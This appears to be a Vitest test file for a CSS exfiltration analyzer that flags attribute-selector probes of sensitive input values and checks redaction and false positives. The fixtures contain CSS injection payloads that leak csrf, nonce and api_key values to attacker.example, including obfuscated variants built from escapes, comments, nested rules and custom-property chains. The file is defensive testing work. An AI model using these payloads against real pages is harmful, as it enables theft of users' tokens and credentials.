import { describe, expect, it } from "vitest";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import { parseAttributeSelectors } from "../../../src/core/analyzer/analyzeSelector";
import { extractUrls } from "../../../src/core/css/normalizeUrl";
import { parseCss } from "../../../src/core/css/parseCss";

const pageUrl = "https://app.example.test/account";
function analyze(cssText: string) { return analyzeStylesheet({ cssText, pageUrl, sourceKind: "style_element", sourceUrl: pageUrl }); }

describe("core analyzer", () => {
  it("detects classic value-prefix CSS exfil", () => {
    const summary = analyze('input[value^="a"]{background-image:url("https://attacker.example/a")}');
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.prefix_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("sink.remote_url"))).toBe(true);
  });

  it("does not confuse data-value with value", () => {
    const attrs = parseAttributeSelectors('[data-value="0"]');
    expect(attrs).toEqual([{ name: "data-value", operator: "=", value: "0", flags: null }]);
    const summary = analyze('[data-value="0"]{background:url("/local.png")}');
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("treats remote URLs containing ;base64, as remote", () => {
    const [pathUrl] = extractUrls('url("https://attacker.example/;base64,pwned.png")', pageUrl);
    const [fragmentUrl] = extractUrls('url("https://attacker.example/a.png#;base64,")', pageUrl);
    expect(pathUrl.isRemote).toBe(true);
    expect(fragmentUrl.isRemote).toBe(true);
    expect(pathUrl.isData).toBe(false);
  });

  it("classifies data URLs as data, not remote", () => {
    const [url] = extractUrls("url(data:image/png;base64,iVBORw0KGgo=)", pageUrl);
    expect(url.isData).toBe(true);
    expect(url.isRemote).toBe(false);
  });

  it("detects CSS custom-property URL indirection and fallback chains", () => {
    const summary = analyze(':root{--leak:url(https://attacker.example/v)} input[name="csrf"][value^="a"]{background:var(--missing,var(--leak))}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.custom_property.url_sink"))).toBe(true);
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("recursively walks nested grouping rules", () => {
    const rules = parseCss({ cssText: '@media screen{@supports selector(:has(*)){input[value^="x"]{background:url(https://attacker.example/x)}}}', pageUrl, sourceKind: "style_element", sourceUrl: pageUrl });
    expect(rules).toHaveLength(1);
    expect(rules[0].context.atRuleStack).toHaveLength(2);
    const summary = analyze('@media screen{@supports selector(:has(*)){input[value^="x"]{background:url(https://attacker.example/x)}}}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
  });

  it("detects :has() sensitive selectors", () => {
    const summary = analyze('form:has(input[name="nonce"][value^="n"]){background:url(https://attacker.example/n)}');
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.relational.has"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.sensitive_name"))).toBe(true);
  });

  it("handles comments, escapes, and mixed case around url/import tokens", () => {
    expect(analyze('input[value^="c"]{background-image:u/**/rl(https://attacker.example/c)}').findings.length).toBeGreaterThan(0);
    expect(analyze('input[value^="e"]{background-image:u\\72l(https://attacker.example/e)}').findings.length).toBeGreaterThan(0);
    expect(analyze('@ImPoRt url(https://attacker.example/import.css);').findings.length).toBeGreaterThan(0);
  });

  it("redacts sensitive selector values from findings", () => {
    const summary = analyze('input[name="csrf_token"][value^="secret"]{background:url(https://attacker.example/x)}');
    const serialized = JSON.stringify(summary.findings);
    expect(serialized).not.toContain("secret");
    expect(serialized).not.toContain("value^=\"secret\"");
    expect(serialized).toContain("[redacted]");
  });

  it("redacts token-like attribute values while preserving diagnostic shape", () => {
    const summary = analyze('input[data-token="abcd1234abcd1234abcd1234"]{background:url(https://attacker.example/x)}');
    const serialized = JSON.stringify(summary.findings);
    expect(serialized).not.toContain("abcd1234abcd1234abcd1234");
    expect(serialized).toContain("data-token");
    expect(serialized).toContain("[redacted]");
  });

  it("uses the hardened parser for namespace, escaped property, and escaped url syntax", () => {
    const summary = analyze('@namespace svg url("http://www.w3.org/2000/svg"); @media screen { input[name="csrf_token"][value^="a"] { back\\67 round-image: u\\72l("https://attacker.example/ns") } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
    expect(JSON.stringify(summary.findings)).not.toContain('value^="a"');
  });

  it("parses nested CSS style rules when supported by the hardened parser", () => {
    const summary = analyze('.profile { & input[name="nonce"][value$="z"] { background-image: url("https://attacker.example/nested-style") } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.suffix_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
  });

  it("recovers conservatively from malformed declaration separators", () => {
    const summary = analyze('@media screen { input[name="api_key"][value^="x"] { background-image: url("https://attacker.example/malformed") color: red } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.sensitive_name"))).toBe(true);
  });


  it("does not treat common UI substring selectors as sensitive value probes", () => {
    expect(analyze('[class*="icon-"]::before{font-family:IconFont}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('[data-light-theme*="dark"] .octicon{background-image:url("https://github.githubassets.com/images/theme.svg")}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('input[type="password"].f-input[disabled]{background-image:url("/content/img/disabled.svg")}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("does not block common third-party font stylesheet imports", () => {
    expect(analyze('@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('@import url("https://use.typekit.net/abcd123.css");').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('@import url("https://attacker.example/import.css");').findings.length).toBeGreaterThan(0);
  });

});
